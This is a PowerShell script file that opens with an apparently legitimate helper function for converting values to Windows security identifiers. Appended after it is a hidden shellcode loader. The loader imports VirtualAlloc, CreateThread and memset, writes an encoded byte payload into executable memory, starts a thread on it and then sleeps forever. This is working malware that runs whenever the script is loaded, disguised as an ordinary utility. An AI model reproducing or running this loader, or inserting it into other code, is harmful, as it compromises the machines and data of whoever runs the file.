
function ConvertTo-CSecurityIdentifier
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        
        $SID
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
    
    try
    {
        if( $SID -is [string] )
        {
            New-Object 'Security.Principal.SecurityIdentifier' $SID
        }
        elseif( $SID -is [byte[]] )
        {
            New-Object 'Security.Principal.SecurityIdentifier' $SID,0
        }
        elseif( $SID -is [Security.Principal.SecurityIdentifier] )
        {
            $SID
        }
        else
        {
            Write-Error ('Invalid SID. The `SID` parameter accepts a `System.Security.Principal.SecurityIdentifier` object, a SID in SDDL form as a `string`, or a SID in binary form as byte array. You passed a ''{0}''.' -f $SID.GetType())
            return
        }
    }
    catch
    {
        Write-Error ('Exception converting SID parameter to a `SecurityIdentifier` object. This usually means you passed an invalid SID in SDDL form (as a string) or an invalid SID in binary form (as a byte array): {0}' -f $_.Exception.Message)
        return
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbe,0xa5,0x04,0xe4,0x76,0xd9,0xec,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x70,0x13,0x83,0xe8,0xfc,0x03,0x70,0xaa,0xe6,0x11,0x8a,0x5c,0x64,0xd9,0x73,0x9c,0x09,0x53,0x96,0xad,0x09,0x07,0xd2,0x9d,0xb9,0x43,0xb6,0x11,0x31,0x01,0x23,0xa2,0x37,0x8e,0x44,0x03,0xfd,0xe8,0x6b,0x94,0xae,0xc9,0xea,0x16,0xad,0x1d,0xcd,0x27,0x7e,0x50,0x0c,0x60,0x63,0x99,0x5c,0x39,0xef,0x0c,0x71,0x4e,0xa5,0x8c,0xfa,0x1c,0x2b,0x95,0x1f,0xd4,0x4a,0xb4,0xb1,0x6f,0x15,0x16,0x33,0xbc,0x2d,0x1f,0x2b,0xa1,0x08,0xe9,0xc0,0x11,0xe6,0xe8,0x00,0x68,0x07,0x46,0x6d,0x45,0xfa,0x96,0xa9,0x61,0xe5,0xec,0xc3,0x92,0x98,0xf6,0x17,0xe9,0x46,0x72,0x8c,0x49,0x0c,0x24,0x68,0x68,0xc1,0xb3,0xfb,0x66,0xae,0xb0,0xa4,0x6a,0x31,0x14,0xdf,0x96,0xba,0x9b,0x30,0x1f,0xf8,0xbf,0x94,0x44,0x5a,0xa1,0x8d,0x20,0x0d,0xde,0xce,0x8b,0xf2,0x7a,0x84,0x21,0xe6,0xf6,0xc7,0x2d,0xcb,0x3a,0xf8,0xad,0x43,0x4c,0x8b,0x9f,0xcc,0xe6,0x03,0x93,0x85,0x20,0xd3,0xd4,0xbf,0x95,0x4b,0x2b,0x40,0xe6,0x42,0xef,0x14,0xb6,0xfc,0xc6,0x14,0x5d,0xfd,0xe7,0xc0,0xc8,0xf8,0x7f,0x2b,0xa4,0x02,0x5e,0xc3,0xb7,0x04,0xb1,0x4f,0x31,0xe2,0xe1,0x3f,0x11,0xbb,0x41,0x90,0xd1,0x6b,0x29,0xfa,0xdd,0x54,0x49,0x05,0x34,0xfd,0xe3,0xea,0xe1,0x55,0x9b,0x93,0xab,0x2e,0x3a,0x5b,0x66,0x4b,0x7c,0xd7,0x85,0xab,0x32,0x10,0xe3,0xbf,0xa2,0xd0,0xbe,0xe2,0x64,0xee,0x14,0x88,0x88,0x7a,0x93,0x1b,0xdf,0x12,0x99,0x7a,0x17,0xbd,0x62,0xa9,0x2c,0x74,0xf7,0x12,0x5a,0x79,0x17,0x93,0x9a,0x2f,0x7d,0x93,0xf2,0x97,0x25,0xc0,0xe7,0xd7,0xf3,0x74,0xb4,0x4d,0xfc,0x2c,0x69,0xc5,0x94,0xd2,0x54,0x21,0x3b,0x2c,0xb3,0xb3,0x07,0xfb,0xfd,0xc1,0x69,0x3f;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

